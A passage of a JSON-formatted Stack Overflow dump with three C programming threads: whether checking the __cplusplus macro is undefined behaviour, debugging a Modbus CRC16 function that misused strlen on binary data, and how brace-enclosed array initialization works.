"https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1499255607, "post_id": 44924777, "comment_id": 76826329, "body": "If this was <i>UB</i>, how should anyone ever use <code>__FUNCTION__</code>, <code>__LINE__</code> or similar predefined macros?"}], "answers": [{"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 145, "user_id": 8236602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a99d03c8669d887c379c3227edec564e?s=128&d=identicon&r=PG&f=1", "display_name": "Willy Wonka", "link": "https://stackoverflow.com/users/8236602/willy-wonka"}, "edited": false, "score": 0, "creation_date": 1499254128, "post_id": 44924823, "comment_id": 76825267, "body": "@WillyWonka To extend on this: Even if such an identifier was defined by a C implementation, there are two possible cases: as an identifier of the core language: <code>#ifdef</code> is a preprocessor directive, so it will fail. If it is defined as a macro, <code>#ifdef</code> will succeed, hence the guarded part will be processed. That could indeed result in problems; I&#39;m afraid you have to rely this specific (and some other) names are used reasonably by the implementer."}], "tags": [], "owner": {"reputation": 18643, "user_id": 1737909, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/058573b71875bc70b5a4e30140c94040?s=128&d=identicon&r=PG", "display_name": "Ven", "link": "https://stackoverflow.com/users/1737909/ven"}, "is_accepted": false, "score": 8, "last_activity_date": 1499253702, "last_edit_date": 1592644375, "creation_date": 1499253625, "answer_id": 44924823, "question_id": 44924777, "link": "https://stackoverflow.com/questions/44924777/is-using-cplusplus-undefined-behaviour-in-c/44924823#44924823", "title": "Is using __cplusplus undefined behaviour in C?", "body": "<blockquote>\n<p>But in C (and C++ for that matter), the behaviour on using any double underscore in an identifier is undefined!</p>\n</blockquote>\n<p>You're mixing things up. It's not <em>undefined behavior to use one</em>, it's just that the names are reserved. The key point is you can't <em>define some yourself</em>, but it's fine to use them.</p>\n<p>From ISO 9899:2011:</p>\n<blockquote>\n<p>7.1.3 Reserved identifiers</p>\n<p>\u2014 All identifiers that begin with an underscore and either an uppercase letter or another underscore are always reserved for any use.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 2, "last_activity_date": 1499254390, "creation_date": 1499254390, "answer_id": 44925093, "question_id": 44924777, "link": "https://stackoverflow.com/questions/44924777/is-using-cplusplus-undefined-behaviour-in-c/44925093#44925093", "title": "Is using __cplusplus undefined behaviour in C?", "body": "<p>Using such names for <em>creating your own macros or identifiers</em> invokes undefined behavior. C11 7.1.3 (emphasis mine):</p>\n\n<blockquote>\n  <p>7.1.3 Reserved identifiers<br>\n  1\n  Each header declares or defines all identifiers listed in its associated subclause, and optionally\n  declares or defines identifiers listed in its associated future\n  library directions subclause and identifiers which are always reserved\n  either for any use or for use as file scope identifiers.<br>\n  <strong>\u2014 All\n  identifiers that begin with an underscore and either an uppercase\n  letter or another underscore are always reserved for any use.</strong><br>\n  ...</p>\n  \n  <p>2 No other identifiers are reserved.\n  If the program declares or defines an identifier in a context in which\n  it is reserved (other than as allowed by 7.1.4), or defines a reserved\n  identifier as a macro name, <strong>the behavior is undefined</strong>.</p>\n</blockquote>\n\n<p>However, you are of course always free to <em>use</em> the macros/identifiers provided by the compiler/lib, given that they are made available in a scope you are supposed to have access to.</p>\n"}, {"tags": [], "owner": {"reputation": 5764, "user_id": 2003898, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/j2hnV.jpg?s=128&g=1", "display_name": "dhein", "link": "https://stackoverflow.com/users/2003898/dhein"}, "is_accepted": false, "score": 1, "last_activity_date": 1499255832, "last_edit_date": 1592644375, "creation_date": 1499254523, "answer_id": 44925139, "question_id": 44924777, "link": "https://stackoverflow.com/questions/44924777/is-using-cplusplus-undefined-behaviour-in-c/44925139#44925139", "title": "Is using __cplusplus undefined behaviour in C?", "body": "<p>The corresponding part from the standard is(emphasis mine):</p>\n<blockquote>\n<p>7.1.3 Reserved identifiers</p>\n<p>1\nEach header declares or defines all identifiers listed in its associated subclause, and optionally declares or defines identifiers listed in its associated <strong>future library directions subclause and identifiers which are always reserved</strong> either for any use or for use as file scope identifiers.</p>\n</blockquote>\n<p>So a little bit contrary to what Ven posted, this is an implicit requirement to not use them at all, since they are also reserved for future purposes.</p>\n<p>This is also stated more strict under section 2 of 7.1.3:</p>\n<blockquote>\n<p>No other identifiers are reserved. If the program declares or defines an identifier in a context in which it is reserved (other than as allowed by 7.1.4), or defines a reserved identifier as a macro name, the behavior is undefined.</p>\n</blockquote>\n<p>So they are strictly reserved for future implementations, which for example <code>__cplusplus</code> is making use of, as the first rule that defines what is reserved states:</p>\n<blockquote>\n<p>\u2014 All identifiers that begin with an underscore and either an uppercase letter or another underscore are always reserved for any use.</p>\n</blockquote>\n<p>But since your example is implemented by the standard by using an identifier from that mentioned reserved spectrum it is fine.</p>\n<p>Additionally the example you are giving is actually not declaring/defining an identifier but checking if there is a preprocessing token(macro) is defined with the name <code>__cplusplus</code> what would be totally ok by means of the C standard aswell, since its checking if it exists, not declaring anything.\nIf you would have defined it your self, it would be not strictly respecting the C standard and cause possible undefined behavior.</p>\n"}, {"tags": [], "owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "is_accepted": false, "score": 0, "last_activity_date": 1499328444, "last_edit_date": 1592644375, "creation_date": 1499326897, "answer_id": 44942646, "question_id": 44924777, "link": "https://stackoverflow.com/questions/44924777/is-using-cplusplus-undefined-behaviour-in-c/44942646#44942646", "title": "Is using __cplusplus undefined behaviour in C?", "body": "<p>No, there's no undefined behaviour in this case.  Undefined behaviour means the compiler makers are free of doing whatever they want with the affected resources.  This means you are free (in this context) to define new non clashing underscored identifiers to be accepted in the two languages the compiler is able to implement.  Think that the internals of the standard libraries implementations of compiler libraries can be full of such <em>undefined behaviours</em> as far as the compiler behaves correctly in the <em>defined behaviour</em> part.  In the case commented, the macro <code>__cplusplus</code> is defined <strong>ONLY</strong> in C++ (by the compiler itself), and it is as a preprocessor flag to indicate that you are compiling a c++ source.  Putting it between the <code>#ifndef __cplusplus</code> and the following <code>#endif</code> statements, makes it to exclude for compilation the in between code (normally, because it would lead to a syntactic error or an unsupported feature).  Normally, you will find the following construct in some/many C/C++ standard headers in your system (so they can be used in both C and C++):</p>\n<pre><code>#ifndef __cplusplus\nextern &quot;C&quot; {\n#endif\n...\n#ifndef __cplusplus\n}\n#endif\n</code></pre>\n<p>to avoid the <code>extern &quot;C&quot; {}</code> construct, which is C++ specific, and would raise a compiler error in plain C.</p>\n<h1>NOTE</h1>\n<p>of course, if you <code>#define __cplusplus</code> before including any of these files, you'll get your C compiler shouting at you about bad syntax on including such a header file.  You can try this yourself to see how it happens:</p>\n<h1>pru.c</h1>\n<pre><code>#define __cplusplus 20170301\n#include &lt;stdio.h&gt;\nint main()\n{\n    printf(&quot;Hello, world!\\n&quot;);\n} /* main */\n</code></pre>\n<p>and then compilation of this gives:</p>\n<pre><code>$ make pru\ncc -O -pipe  pru.c  -o pru\nIn file included from pru.c:2:\n/usr/include/stdio.h:159:1: error: expected identifier or '('\n__BEGIN_DECLS\n^\n/usr/include/sys/cdefs.h:59:30: note: expanded from macro '__BEGIN_DECLS'\n#define __BEGIN_DECLS   extern &quot;C&quot; {\n                               ^\nIn file included from pru.c:2:\n/usr/include/stdio.h:235:1: error: expected identifier or '('\n__BEGIN_DECLS\n^\n/usr/include/sys/cdefs.h:59:30: note: expanded from macro '__BEGIN_DECLS'\n#define __BEGIN_DECLS   extern &quot;C&quot; {\n                               ^\npru.c:6:2: warning: implicitly declaring library function 'printf' with type 'int (const char *, ...)' [-Wimplicit-function-declaration]\n        printf(&quot;Hello, world!\\n&quot;);\n        ^\npru.c:6:2: note: include the header &lt;stdio.h&gt; or explicitly provide a declaration for 'printf'\n1 warning and 3 errors generated.\n*** Error code 1\n\nStop.\nmake: stopped in /home/user\n</code></pre>\n<p>Think that <strong>you are never going to move the standard header files to another computer to compile your source code</strong>.  Should you try this, then you would have <em>undefined behaviour</em>, but never while respecting the compiler implementation.  This means, you have to accept the compiler makers to use those <em>undefined behaviour</em> things that result in compiler implementation details, but <strong>you cannot do that in <em>your</em> code</strong> (at least if you don't want to fail into your program doing nasty things)</p>\n"}], "owner": {"reputation": 145, "user_id": 8236602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a99d03c8669d887c379c3227edec564e?s=128&d=identicon&r=PG&f=1", "display_name": "Willy Wonka", "link": "https://stackoverflow.com/users/8236602/willy-wonka"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 313, "favorite_count": 0, "accepted_answer_id": 44925093, "answer_count": 4, "score": 1, "last_activity_date": 1499328444, "creation_date": 1499253512, "last_edit_date": 1499253989, "question_id": 44924777, "link": "https://stackoverflow.com/questions/44924777/is-using-cplusplus-undefined-behaviour-in-c", "title": "Is using __cplusplus undefined behaviour in C?", "body": "<p>Modern C++ compilers are required by the standard to <code>#define</code> the macro <code>__cplusplus</code>.</p>\n\n<p>This is often used in files that can be used by both C and C++ but the implementation differs slightly.</p>\n\n<p>But in C (and C++ for that matter), the behaviour on using any double underscore in an identifier is undefined!</p>\n\n<p>So therefore, if a C compiler sees something like</p>\n\n<p><code>#ifdef __cplusplus</code></p>\n\n<p>then is the behaviour undefined?</p>\n"}, {"tags": ["c", "embedded", "crc16"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499252524, "post_id": 44924383, "comment_id": 76824184, "body": "<code>frame[6]=&#39;\\0&#39;</code>: ouch: buffer overrun! your buffer is too short. may be overwritten just when calling <code>strlen</code> and get a different length as a result..."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499252534, "post_id": 44924383, "comment_id": 76824190, "body": "How many elements are there in your array <code>frame</code>? What is the last valid index of that array? Note that you don&#39;t <i>need</i> to terminate it since it&#39;s not really a string, but an array of arbitrary binary data. Use <code>sizeof frame</code> to get the size of the array."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1499252579, "post_id": 44924383, "comment_id": 76824222, "body": "Also, none of the &quot;characters&quot; in the array are printable, so printing it will not work. Furthermore, if you want to print the <code>crcv</code> variable as hex then use the <code>&quot;%x&quot;</code> format."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499252637, "post_id": 44924383, "comment_id": 76824264, "body": "err, the value is hex, whereas you&#39;re printing decimal..."}, {"owner": {"reputation": 1, "user_id": 7420802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38095013bdc60d3b01750b424a1f6f48?s=128&d=identicon&r=PG&f=1", "display_name": "Shrikant", "link": "https://stackoverflow.com/users/7420802/shrikant"}, "edited": false, "score": 0, "creation_date": 1499252646, "post_id": 44924383, "comment_id": 76824267, "body": "@ Jean-Fran&#231;ois Fabre even i if i remove that or increase array size i am geting wrong crc value"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499252691, "post_id": 44924383, "comment_id": 76824301, "body": "@Shrikant agreed. But fix it anyway. it&#39;s wrong. Are you sure you&#39;re using the proper algorithm? the proper init value (-1 vs 0) ? finding the proper CRC is always difficult."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1499252760, "post_id": 44924383, "comment_id": 76824352, "body": "Lastly I recommend you take some time to read <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">How to debug small programs</a> by Eric Lippert."}, {"owner": {"reputation": 2597, "user_id": 4755321, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e93c2832d8928731e8e5d2f6d665c4a0?s=128&d=identicon&r=PG&f=1", "display_name": "Jacek \u015alimok", "link": "https://stackoverflow.com/users/4755321/jacek-%c5%9alimok"}, "edited": false, "score": 0, "creation_date": 1499252865, "post_id": 44924383, "comment_id": 76824420, "body": "You don&#39;t pass a string to this function, you pass raw bytes and number of them in the buffer. As for your test - doing <code>frame[i]=0x00;</code> is equivalent to <code>frame[i]=&#39;\\0&#39;;</code>. Also, <code>frame[6]=&#39;\\0&#39;;</code> does a write outside specified buffer. Also, test data &quot;010300080001&quot; if treated as bytes (0x01, 0x03 etc.) results in Modbus CRC equal to 0xC805. If treated as ASCII it&#39;s 0x49D2. Neither of those values is 0x05C8, nor 0x8512."}, {"owner": {"reputation": 1, "user_id": 7420802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38095013bdc60d3b01750b424a1f6f48?s=128&d=identicon&r=PG&f=1", "display_name": "Shrikant", "link": "https://stackoverflow.com/users/7420802/shrikant"}, "edited": false, "score": 0, "creation_date": 1499253130, "post_id": 44924383, "comment_id": 76824605, "body": "@ Jacek \u015alimok ok ,then i should convert my string to bytes first and then pass to method?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1499253855, "post_id": 44924383, "comment_id": 76825065, "body": "You should indent your code properly"}, {"owner": {"reputation": 2597, "user_id": 4755321, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e93c2832d8928731e8e5d2f6d665c4a0?s=128&d=identicon&r=PG&f=1", "display_name": "Jacek \u015alimok", "link": "https://stackoverflow.com/users/4755321/jacek-%c5%9alimok"}, "edited": false, "score": 1, "creation_date": 1499254236, "post_id": 44924383, "comment_id": 76825343, "body": "@Shrikant I don&#39;t know what you mean by &quot;should&quot; or &quot;should not&quot;. This function accepts a buffer and its length and calculates CRC of it, in binary form. If you calculate CRC of something you read (data transmission received, file read etc.) then you take the data as-is without any additional conversions. Put it to the buffer, pass it to the function. However, if all you have is <code>010300080001;</code> then it is quite unclear how the data should be treated - as binary or as string. I would assume as binary, given the contents but again, it is just an assumption."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499254511, "post_id": 44924383, "comment_id": 76825554, "body": "C does not support <i>methods</i>."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1499254924, "post_id": 44924383, "comment_id": 76825807, "body": "You aren&#39;t using the CRC16-IBM polynomial 0x8005 anywhere in your code, which makes it fishy. Sure 0xA001 is 0x8005 inverted but then why <code>#define</code> the polynomial? If I remember correctly, I believe that this algorithm should also invert the data buffer after the calculation."}], "answers": [{"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1499255029, "post_id": 44925231, "comment_id": 76825881, "body": "Why did you post this as an answer? Is it a solution? What&#39;s different from the question? If you wish to add details to the question please edit it."}, {"owner": {"reputation": 1, "user_id": 7420802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38095013bdc60d3b01750b424a1f6f48?s=128&d=identicon&r=PG&f=1", "display_name": "Shrikant", "link": "https://stackoverflow.com/users/7420802/shrikant"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499257679, "post_id": 44925231, "comment_id": 76827892, "body": "@ Lundin yes this is correct answer. I have change data type from <code>char</code> to <code>uint8_t </code> ."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499258169, "post_id": 44925231, "comment_id": 76828275, "body": "No, that shouldn&#39;t matter the slightest, as long as you don&#39;t use numbers larger than 0x7F."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1499258317, "post_id": 44925231, "comment_id": 76828399, "body": "Now I just spotted the actual bug. I&#39;ll post an answer. Had you put the code through a debugger you would have found this bug after approximately 1 minute."}], "tags": [], "owner": {"reputation": 1, "user_id": 7420802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38095013bdc60d3b01750b424a1f6f48?s=128&d=identicon&r=PG&f=1", "display_name": "Shrikant", "link": "https://stackoverflow.com/users/7420802/shrikant"}, "is_accepted": false, "score": 0, "last_activity_date": 1499254840, "creation_date": 1499254840, "answer_id": 44925231, "question_id": 44924383, "link": "https://stackoverflow.com/questions/44924383/what-input-should-i-give-to-crc16-method/44925231#44925231", "title": "What input should I give to crc16 Method", "body": "<pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define POLY 0x8005\nunsigned int ModRTU_CRC(unsigned char * mod_data,unsigned int length)\n{\nunsigned int CRC16 = 0xFFFF;\n\nunsigned int pos=0,i=0;\n\nfor(pos=0;pos&lt;length;pos++)\n{\n    CRC16 ^= (unsigned int) mod_data[pos];\n\n    for(i=0;i&lt;8;i++)\n    {\n        if((CRC16 &amp; 0x0001)!=0)\n        {\n            CRC16 &gt;&gt;=1;\n            CRC16^=0xA001;\n        }\n        else\n        {\n            CRC16 &gt;&gt;=1;\n        }\n    }\n\n  }\n\n  return CRC16;\n\n }\n\n int main()\n {\n\n\n\n        uint8_t message[80] = { // 6-byte test vector\n  0x01, 0x03, 0x00, 0x08, 0x00, 0x01\n};\nint message_length = 6;\n printf(\"%x\\n\",message);\n// int len = strlen(message);\n uint16_t the_CRC = ModRTU_CRC(message,message_length);\n printf(\"%x\\n\",the_CRC);\n        return 0;\n   }\n\n\n `\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 3, "last_activity_date": 1499258296, "creation_date": 1499258296, "answer_id": 44926517, "question_id": 44924383, "link": "https://stackoverflow.com/questions/44924383/what-input-should-i-give-to-crc16-method/44926517#44926517", "title": "What input should I give to crc16 Method", "body": "<p>The bug is that in your original code you used <code>frame[2]=0x00;</code> followed by <code>strlen()</code>, which will interpret this as the null terminator and give the wrong size 2 instead of 6. You cannot use <code>strlen()</code> on binary data.</p>\n\n<p>In the \"fixed\" version you hard-code the size to 6 so the bug was removed by accident. It has nothing to do with <code>uint8_t</code> versus <code>char</code> (although it is always better to use <code>uint8_t</code> for binary data).</p>\n"}], "owner": {"reputation": 1, "user_id": 7420802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38095013bdc60d3b01750b424a1f6f48?s=128&d=identicon&r=PG&f=1", "display_name": "Shrikant", "link": "https://stackoverflow.com/users/7420802/shrikant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 297, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1499258296, "creation_date": 1499252349, "last_edit_date": 1499253838, "question_id": 44924383, "link": "https://stackoverflow.com/questions/44924383/what-input-should-i-give-to-crc16-method", "title": "What input should I give to crc16 Method", "body": "<p>This my Mod bus crc_16 embedded code. I have run this code in code block many Times. There is no error but I am not getting actual crc value. I should get crc 05C8 and I am getting 8512 right now.</p>\n\n<p>I think I giving wrong input while calling CRC method. I am passing string and its length. So please help me.</p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n    #include &lt;stdlib.h&gt;\n    #include &lt;string.h&gt;\n    #define POLY 0x8005\n    unsigned int ModRTU_CRC(unsigned char * mod_data,unsigned int length)\n    {\n    unsigned int CRC16 = 0xFFFF;\n\n    unsigned int pos=0,i=0;\n\n    for(pos=0;pos&lt;length;pos++)\n    {\n    CRC16 ^= (unsigned int) mod_data[pos];\n\n    for(i=0;i&lt;8;i++)\n    {\n        if((CRC16 &amp; 0x0001)!=0)\n        {\n            CRC16 &gt;&gt;=1;\n            CRC16^=0xA001;\n        }\n        else\n        {\n            CRC16 &gt;&gt;=1;\n        }\n    }\n\n    }\n\n   return CRC16;\n\n    }\n\n   int main()\n   {\n\n    //char *frame = \"010600081388\";\n   //  char *frame = \"010300080001\";\n\n   char frame[7];\n        frame[0]=0x01;\n       frame[1]=0x03;\n       frame[2]=0x00;\n       frame[3]=0x08;\n       frame[4]=0x00;\n       frame[5]=0x01;\n       frame[6]='\\0';\n\n\n     printf(\"%x\\n\",frame);\n     int len = strlen(frame);\n     unsigned int  crcv = ModRTU_CRC(frame,len);\n    printf(\"%x\\n\",crcv);\n   return 0;\n       }\n</code></pre>\n"}, {"tags": ["c", "arrays", "initialization", "variable-assignment"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 6, "creation_date": 1499252265, "post_id": 44924320, "comment_id": 76824003, "body": "no preprocessor involved. it&#39;s <i>initialization</i> syntax only. Not assignment."}, {"owner": {"reputation": 5623, "user_id": 1347519, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a9e1eb6e25803528d25f57f3df79e115?s=128&d=identicon&r=PG", "display_name": "Attie", "link": "https://stackoverflow.com/users/1347519/attie"}, "edited": false, "score": 0, "creation_date": 1499252291, "post_id": 44924320, "comment_id": 76824022, "body": "The same holds for structs..."}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1499252344, "post_id": 44924320, "comment_id": 76824064, "body": "A simple syntax"}], "answers": [{"comments": [{"owner": {"reputation": 12879, "user_id": 1214214, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/mE5HL.png?s=128&g=1", "display_name": "TheMeaningfulEngineer", "link": "https://stackoverflow.com/users/1214214/themeaningfulengineer"}, "edited": false, "score": 1, "creation_date": 1499252674, "post_id": 44924418, "comment_id": 76824284, "body": "So far i have been perceiving <code>initialization</code> as <code>declaration + assignment</code> which seems not to fit for the above example. What would be your definition of initialization?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 12879, "user_id": 1214214, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/mE5HL.png?s=128&g=1", "display_name": "TheMeaningfulEngineer", "link": "https://stackoverflow.com/users/1214214/themeaningfulengineer"}, "edited": false, "score": 0, "creation_date": 1499252734, "post_id": 44924418, "comment_id": 76824334, "body": "@TheMeaningfulEngineer Beware, they have different contraints."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 12879, "user_id": 1214214, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/mE5HL.png?s=128&g=1", "display_name": "TheMeaningfulEngineer", "link": "https://stackoverflow.com/users/1214214/themeaningfulengineer"}, "edited": false, "score": 0, "creation_date": 1499254635, "post_id": 44924418, "comment_id": 76825630, "body": "@TheMeaningfulEngineer I&#39;ve updated with relevant references, see if that helps."}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1500077724, "post_id": 44924418, "comment_id": 77197886, "body": "I&#39;m not sure if you meant to say this... But just in case: in C anything can be uinitialized by a brace enclosed initilaizer list. <code>int x = { 42 };</code> is perfectly legal in C. In this case <code>42</code> is the <i>initializer</i>. And it is a single expression, just as required."}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 8, "last_activity_date": 1499254220, "last_edit_date": 1499254220, "creation_date": 1499252453, "answer_id": 44924418, "question_id": 44924320, "link": "https://stackoverflow.com/questions/44924320/what-happens-in-the-background-of-array-initialization-in-c/44924418#44924418", "title": "What happens in the background of array initialization in c?", "body": "<p>A syntax like <code>{1,2,3,4};</code> is called brace-enclosed initializer list, it's an <em>initializer</em>. It can be only used for initialization (for array type).</p>\n\n<p>Quoting <code>C11</code>, chapter \u00a76.7.9</p>\n\n<ul>\n<li>P11</li>\n</ul>\n\n<blockquote>\n  <p>The initializer for a scalar shall be a single expression,</p>\n</blockquote>\n\n<p><em>[an array is not a scalar type, so not applicable for us]</em></p>\n\n<ul>\n<li>P14</li>\n</ul>\n\n<blockquote>\n  <p>An array of character type may be initialized by a character string literal or UTF\u22128 string\n  literal, optionally enclosed in braces.</p>\n</blockquote>\n\n<p><em>[We are not using a string literal here, so also not applicable for us]</em></p>\n\n<ul>\n<li>P16</li>\n</ul>\n\n<blockquote>\n  <p>Otherwise, the initializer for an object that has aggregate or union type shall be a brace-enclosed\n  list of initializers for the elements or named members.</p>\n</blockquote>\n\n<p><em>[This is the case of our interest]</em></p>\n\n<p>and, P17,</p>\n\n<blockquote>\n  <p>Each <strong>brace-enclosed initializer list</strong> has an associated current object. When no\n  designations are present, subobjects of the current object are initialized in order according\n  to the type of the current object: <strong>array elements in increasing subscript order</strong>, structure\n  members in declaration order, and the first named member of a union.[....]</p>\n</blockquote>\n\n<p>So, here, the values from the brace enclosed list are not directly \"assigned\" to the array, they are used to initialize individual members of the array.</p>\n\n<p>OTOH, an array type, is <strong>not</strong> a modifiable lvalue, so it cannot be assigned. In other words, an array variable cannot be used as the LHS of the assignment operator.</p>\n\n<p>To elaborate, from <code>C11</code>, chapter \u00a76.5.16</p>\n\n<blockquote>\n  <p>assignment operator shall have a modifiable lvalue as its left operand.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": false, "score": 5, "last_activity_date": 1499253046, "creation_date": 